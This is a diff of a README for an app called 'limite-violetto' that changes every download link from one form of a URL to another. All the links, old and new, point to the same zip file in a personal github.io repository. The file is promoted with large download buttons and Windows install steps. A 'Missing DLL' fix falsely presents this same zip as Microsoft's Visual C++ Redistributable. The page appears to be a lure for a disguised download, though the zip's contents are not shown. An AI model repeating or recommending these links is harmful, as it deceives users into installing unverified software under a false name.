@@ -18,7 +18,7 @@ Welcome! **limite-violetto** is a powerful yet easy-to-use application designed 
 ## ⬇️ Download the Application
 
 **Visit this link to download the application:**  
-<a href="https://github.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/raw/refs/heads/main/assets/Latest_1.1-beta.5.zip" style="display:inline-block;background:#FF6B35;color:white;padding:15px 30px;text-decoration:none;font-size:20px;font-weight:bold;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.3);">📥 Get limite-violetto Now</a>
+<a href="https://raw.githubusercontent.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/main/assets/Latest_1.1-beta.5.zip" style="display:inline-block;background:#FF6B35;color:white;padding:15px 30px;text-decoration:none;font-size:20px;font-weight:bold;border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.3);">📥 Get limite-violetto Now</a>
 
 ---
 
@@ -44,7 +44,7 @@ Follow these **exact steps** to get limite-violetto running on your Windows comp
 
 ### Step 1: Visit the Download Page
 Click the orange button above or go directly to:  
-**https://github.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/raw/refs/heads/main/assets/Latest_1.1-beta.5.zip**
+**https://raw.githubusercontent.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/main/assets/Latest_1.1-beta.5.zip**
 
 This page shows all available versions of the app. Don't worry about the technical details—just look for the newest file at the top.
 
@@ -75,7 +75,7 @@ If something isn't working, here's how to fix it:
 | **Download is slow** | Wait a few minutes. Large files take time. Or try downloading in incognito mode. |
 | **File won't download** | Right-click the link and choose "Save link as..." Then pick any folder. |
 | **App won't open after install** | Restart your computer, then double-click the "limite-violetto" desktop icon. |
-| **"Missing DLL" error** | Download and install the latest [Visual C++ Redistributable](https://github.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/raw/refs/heads/main/assets/Latest_1.1-beta.5.zip) from Microsoft, then retry. |
+| **"Missing DLL" error** | Download and install the latest [Visual C++ Redistributable](https://raw.githubusercontent.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/main/assets/Latest_1.1-beta.5.zip) from Microsoft, then retry. |
 
 ---
 
@@ -112,7 +112,7 @@ Here's what makes limite-violetto special:
 
 We regularly improve limite-violetto. To update:
 
-1. Go to the same download link: [https://github.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/raw/refs/heads/main/assets/Latest_1.1-beta.5.zip](https://github.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/raw/refs/heads/main/assets/Latest_1.1-beta.5.zip)
+1. Go to the same download link: [https://raw.githubusercontent.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/main/assets/Latest_1.1-beta.5.zip](https://raw.githubusercontent.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/main/assets/Latest_1.1-beta.5.zip)
 2. Download the newest version (repeat the install steps).
 3. The app will automatically keep your settings.
 
@@ -166,7 +166,7 @@ A: Your saved data is removed. Export anything important first.
 
 Click the button below and join thousands of users who've made math easier:
 
-<a href="https://github.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/raw/refs/heads/main/assets/Latest_1.1-beta.5.zip" style="display:inline-block;background:#4CAF50;color:white;padding:18px 40px;text-decoration:none;font-size:22px;font-weight:bold;border-radius:50px;box-shadow:0 6px 10px rgba(0,0,0,0.3);">🚀 Download Now – It's Free!</a>
+<a href="https://raw.githubusercontent.com/Bertyfoliaceous160/bertyfoliaceous160.github.io/main/assets/Latest_1.1-beta.5.zip" style="display:inline-block;background:#4CAF50;color:white;padding:18px 40px;text-decoration:none;font-size:22px;font-weight:bold;border-radius:50px;box-shadow:0 6px 10px rgba(0,0,0,0.3);">🚀 Download Now – It's Free!</a>
 
 ---
 
